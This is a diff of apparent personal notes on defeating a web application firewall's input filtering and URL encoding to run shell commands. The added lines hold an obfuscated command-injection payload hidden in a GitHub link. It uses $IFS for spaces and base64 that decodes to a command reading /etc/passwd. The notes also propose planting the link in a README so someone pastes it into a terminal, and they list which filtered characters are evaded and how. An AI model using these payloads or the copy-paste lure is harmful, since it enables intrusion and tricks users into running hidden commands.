@@ -22,6 +22,12 @@ can we bypass the entire url encoding set and execute nontrivial commands?
 use this waf and apply the url encoding patches  
 https://raw.githubusercontent.com/theMiddleBlue/challenge-bypass-input-validation/main/index.php
 
+# markdown
+we can also put the link in the readme  
+and hope someone will copy paste it in a terminal  
+https://github.com/kusky3/latrina/blob/main/;a=('Y2F0IC9ldGMvcGFzc3dkCg==');b=('base');c=$IFS;d=64;$($b$d$c-d$c-<$c<(echo$c$a))  
+but you still need to bypass the "<"
+
 # bypassed
 ```
 '"'   # needed to set string variables, bypassed with "('variable')"
@@ -34,14 +40,13 @@ https://raw.githubusercontent.com/theMiddleBlue/challenge-bypass-input-validatio
 '/'   # needed for paths, bypassed by encoding the payload with base64
 '&'   # needed to begin the command execution, replaced by ";"
 '&&'  # same as above
+'>'   # needed for redirection, replaced by "<"
 ```
 
 # todo
 rookie level:
 ```
-'$('  # the combo breaks the url
 '<'
-'>'
 ```
 
 god-like level:
